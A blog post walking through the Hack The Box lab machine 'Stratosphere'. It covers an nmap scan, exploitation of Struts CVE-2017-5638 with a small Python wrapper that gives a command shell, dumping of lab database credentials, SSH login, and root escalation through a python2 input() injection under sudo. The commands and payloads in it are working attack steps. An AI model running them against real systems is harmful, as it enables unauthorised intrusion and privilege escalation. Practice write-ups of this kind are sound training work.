---
layout: post
title:  "Stratosphere"
date:   2018-09-04 14:50:00 +0100
categories: hackthebox
---
* TOC
{:toc}

# Introduction
* Name of Box : Stratosphere
* IP Address : 10.10.10.64

An interesting box showing the power of the Struts vulnerability CVE-2017-5638 and how python can be used for privesc

### Tools Used

* Dirsearch : <https://github.com/maurosoria/dirsearch>
* CVE-2017-5638 : <https://github.com/mazen160/struts-pwn>
* Reverse Shell Cheat Sheet : <http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet>

### Further Reading
* Exploiting Python’s Eval : <https://www.floyd.ch/?p=584>

# Service Detection
First things first, let's see what services we can find on this box

{% highlight plaintext %}
nmap -sC -sV -oA nmap/stratosphere 10.10.10.64

# Nmap 7.70 scan initiated Thu Jul 26 13:24:35 2018 as: nmap -sC -sV -oA nmap/stratosphere 10.10.10.64
Nmap scan report for 10.10.10.64                                                                                                                                                                                   
Host is up (0.040s latency).                                                                                                                                                                                       
Not shown: 997 filtered ports                                                                                                                                                                                      
PORT     STATE SERVICE    VERSION                                                                                                                                                                                  
22/tcp   open  ssh        OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)                                                                                                                                            
| ssh-hostkey:                                                                                                                                                                                                     
|   2048 5b:16:37:d4:3c:18:04:15:c4:02:01:0d:db:07:ac:2d (RSA)                                                                                                                                                     
|   256 e3:77:7b:2c:23:b0:8d:df:38:35:6c:40:ab:f6:81:50 (ECDSA)                                                                                                                                                    
|_  256 d7:6b:66:9c:19:fc:aa:66:6c:18:7a:cc:b5:87:0e:40 (ED25519)                                                                                                                                                  
80/tcp   open  http                                                                                                                                                                                                
| fingerprint-strings:                                                                                                                                                                                             
|   Kerberos, LDAPSearchReq, LPDString, SMBProgNeg, SSLSessionReq, TLSSessionReq:                                                                                                                                  
|     HTTP/1.1 400                                                                                                                                                                                                 
|     Transfer-Encoding: chunked                                                                                                                                                                                   
|     Date: Thu, 26 Jul 2018 12:25:39 GMT                                                                                                                                                                          
|     Connection: close                                                                                                                                                                                            
|   LANDesk-RC, LDAPBindReq, NCP, NotesRPC, SIPOptions, TerminalServer:                                                                                                                                            
|     HTTP/1.1 400                                                                                                                                                                                                 
|     Transfer-Encoding: chunked                                                                                                                                                                                   
|     Date: Thu, 26 Jul 2018 12:25:40 GMT                                                                                                                                                                          
|_    Connection: close                                                                                                                                                                                            
| http-methods:                                                                                                                                                                                                    
|_  Potentially risky methods: PUT DELETE                                                                                                                                                                          
|_http-title: Stratosphere                                                                                                                                                                                         
8080/tcp open  http-proxy                                                                                                                                                                                          
| fingerprint-strings:                                                                                                                                                                                             
|   Help, Kerberos, LPDString, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe:                                                                                                                                 
|     HTTP/1.1 400                                                                                                                                                                                                 
|     Transfer-Encoding: chunked                                                                                                                                                                                   
|     Date: Thu, 26 Jul 2018 12:25:39 GMT                                                                                                                                                                          
|     Connection: close                                                                                                                                                                                            
|   LANDesk-RC, LDAPBindReq, LDAPSearchReq, SIPOptions, TerminalServer:                                                                                                                                            
|     HTTP/1.1 400                                                                                                                                                                                                 
|     Transfer-Encoding: chunked                                                                                                                                                                                   
|     Date: Thu, 26 Jul 2018 12:25:40 GMT                                                                                                                                                                          
|_    Connection: close                                                                                                                                                                                            
| http-methods:                                                                                                                                                                                                    
|_  Potentially risky methods: PUT DELETE                                                                                                                                                                          
|_http-title: Stratosphere                                                                                    
{% endhighlight %}

OK, we have ssh, http on 80 and 8080, although nmap had some trouble identifying them

# Website
![]({{ "assets/stratosphere/1.png" | absolute_url }})

Snazzy looking website. Looking around, we don't find anything obvious to delve into, so lets enumerate.
## Enumeration

`/opt/dirsearch/dirsearch.py -u http://10.10.10.64/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e html --plain-text-report=dirbus_80`

{% highlight plaintext %}
 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions: html | Threads: 10 | Wordlist size: 220521

Error Log: /opt/dirsearch/logs/errors-18-09-04_15-14-46.log

Target: http://10.10.10.64/

[15:14:46] Starting: 
[15:14:46] 200 -    2KB - /
[15:18:53] 302 -    0B  - /manager  ->  /manager/
[15:18:53] 302 -    0B  - /Monitoring  ->  /Monitoring/
{% endhighlight %}

The manager directory is password protected, we may need hydra later on.

The Monitoring directory redirects us to the URL `http://10.10.10.64/Monitoring/example/Welcome.action`

A quick google for urls ending in Action, mentions Struts. Struts has some pretty well documented exploits, so let's try some
## Struts Attack

We start with the CVE-2017-5638 that equifax were pwned by. A quick google gives us some POC code <https://github.com/mazen160/struts-pwn>

{% highlight plaintext %}
root@kali:~/HTB/stratosphere/struts/struts-pwn# ./struts-pwn.py -u http://10.10.10.64/Monitoring/example/Register.action -c id

[*] URL: http://10.10.10.64/Monitoring/example/Register.action
[*] CMD: id
[!] ChunkedEncodingError Error: Making another request to the url.
Refer to: https://github.com/mazen160/struts-pwn/issues/8 for help.
EXCEPTION::::--> ('Connection broken: IncompleteRead(0 bytes read)', IncompleteRead(0 bytes read))
Note: Server Connection Closed Prematurely

uid=115(tomcat8) gid=119(tomcat8) groups=119(tomcat8)

[%] Done.
{% endhighlight %}

We have command execution. Now to get a reverse shell

# Reverse Shell
Listen on port 9001
`nc -lvnp 9001`

Then lets send a reverse shell command via our struts exploit

Nothing seems to work, so I created a simple python script to loop the struts exploit and give me a kinda-shell

{% highlight python %}
#!/usr/bin/python

import os

while True:
    cmd = raw_input('enter command : ')
    os.system('./struts-pwn.py --url http://10.10.10.64:8080/Monitoring/example/Register.action -c "{}"'.format(cmd))
{% endhighlight %}

# File System Enumeration
Within our working directory there is a db_connect file with some credentials

{% highlight plaintext %}
enter command : cat db_connect

[*] URL: http://10.10.10.64:8080/Monitoring/example/Register.action
[*] CMD: cat db_connect
[!] ChunkedEncodingError Error: Making another request to the url.
Refer to: https://github.com/mazen160/struts-pwn/issues/8 for help.
EXCEPTION::::--> ('Connection broken: IncompleteRead(0 bytes read)', IncompleteRead(0 bytes read))
Note: Server Connection Closed Prematurely

[ssn]
user=ssn_admin
pass=AWs64@on*&

[users]
user=admin
pass=admin

[%] Done.
{% endhighlight %}

# Database Enumeration
Users sounds interesting, lets try the credentials with the mysql command, through our kinda-shell

{% highlight plaintext %}
enter command : mysql -uadmin -padmin -D users -e \"show tables\"

[*] URL: http://10.10.10.64:8080/Monitoring/example/Register.action
[*] CMD: mysql -uadmin -padmin -D users -e "show tables"
[!] ChunkedEncodingError Error: Making another request to the url.
Refer to: https://github.com/mazen160/struts-pwn/issues/8 for help.
EXCEPTION::::--> ('Connection broken: IncompleteRead(0 bytes read)', IncompleteRead(0 bytes read))
Note: Server Connection Closed Prematurely

Tables_in_users
accounts

[%] Done.
enter command : mysql -uadmin -padmin -D users -e \"select * from accounts\"

[*] URL: http://10.10.10.64:8080/Monitoring/example/Register.action
[*] CMD: mysql -uadmin -padmin -D users -e "select * from accounts"
[!] ChunkedEncodingError Error: Making another request to the url.
Refer to: https://github.com/mazen160/struts-pwn/issues/8 for help.
EXCEPTION::::--> ('Connection broken: IncompleteRead(0 bytes read)', IncompleteRead(0 bytes read))
Note: Server Connection Closed Prematurely

fullName        password        username
Richard F. Smith        9tc*rhKuG5TyXvUJOrE^5CK7k       richard

[%] Done.
{% endhighlight %}

We have a username and a password. Always worth checking this out with the ssh service

# SSH Connection
{% highlight plaintext %}
root@kali:~/HTB/stratosphere# ssh richard@10.10.10.64
richard@10.10.10.64's password:
Linux stratosphere 4.9.0-6-amd64 #1 SMP Debian 4.9.82-1+deb9u2 (2018-02-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Feb 27 16:26:33 2018 from 10.10.14.2
richard@stratosphere:~$
richard@stratosphere:/home/richard# ls
Desktop  test.py  user.txt
{% endhighlight %}
And we have user access. Grab the user flag

# Privesc
## Sudo
Whenever I have the users password, I always check sudo first

{% highlight plaintext %}
richard@stratosphere:~$ sudo -l
Matching Defaults entries for richard on stratosphere:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User richard may run the following commands on stratosphere:
    (ALL) NOPASSWD: /usr/bin/python* /home/richard/test.py
{% endhighlight %}

So we can run any version of python against the test.py file, as root
## test.py
Contents of test.py
{% highlight python %}
#!/usr/bin/python3
import hashlib


def question():
    q1 = input("Solve: 5af003e100c80923ec04d65933d382cb\n")
    md5 = hashlib.md5()
    md5.update(q1.encode())
    if not md5.hexdigest() == "5af003e100c80923ec04d65933d382cb":
        print("Sorry, that's not right")
        return
    print("You got it!")
    q2 = input("Now what's this one? d24f6fb449855ff42344feff18ee2819033529ff\n")
    sha1 = hashlib.sha1()
    sha1.update(q2.encode())
    if not sha1.hexdigest() == 'd24f6fb449855ff42344feff18ee2819033529ff':
        print("Nope, that one didn't work...")
        return
    print("WOW, you're really good at this!")
    q3 = input("How about this? 91ae5fc9ecbca9d346225063f23d2bd9\n")
    md4 = hashlib.new('md4')
    md4.update(q3.encode())
    if not md4.hexdigest() == '91ae5fc9ecbca9d346225063f23d2bd9':
        print("Yeah, I don't think that's right.")
        return
    print("OK, OK! I get it. You know how to crack hashes...")
    q4 = input("Last one, I promise: 9efebee84ba0c5e030147cfd1660f5f2850883615d444ceecf50896aae083ead798d13584f52df0179df0200a3e1a122aa738beff263b49d2443738eba41c943\n")
    blake = hashlib.new('BLAKE2b512')
    blake.update(q4.encode())
    if not blake.hexdigest() == '9efebee84ba0c5e030147cfd1660f5f2850883615d444ceecf50896aae083ead798d13584f52df0179df0200a3e1a122aa738beff263b49d2443738eba41c943':
        print("You were so close! urg... sorry rules are rules.")
        return

    import os
    os.system('/root/success.py')
    return

question()
{% endhighlight %}

As sudo let's us use any version of python, we can exploit an issue with the input function in python2, in order to get a root shell

{% highlight plaintext %}
richard@stratosphere:~$ sudo python2 /home/richard/test.py
Solve: 5af003e100c80923ec04d65933d382cb
__import__('os').system('/bin/bash')

root@stratosphere:/home/richard# ls
Desktop  test.py  user.txt

root@stratosphere:/home/richard# whoami
root

root@stratosphere:/home/richard# ls -l /root/
total 36
drwxr-xr-x 2 root root 4096 Feb 10  2018 Desktop
drwxr-xr-x 2 root root 4096 Feb 27  2018 Documents
drwxr-xr-x 2 root root 4096 Feb 27  2018 Downloads
drwxr-xr-x 2 root root 4096 Feb 27  2018 Music
drwxr-xr-x 2 root root 4096 Feb 27  2018 Pictures
drwxr-xr-x 2 root root 4096 Feb 27  2018 Public
drwxr-xr-x 2 root root 4096 Feb 27  2018 Templates
drwxr-xr-x 2 root root 4096 Feb 27  2018 Videos
-r-------- 1 root root   33 Oct 28  2017 root.txt
{% endhighlight %}

Grab the root flag and do a little dance
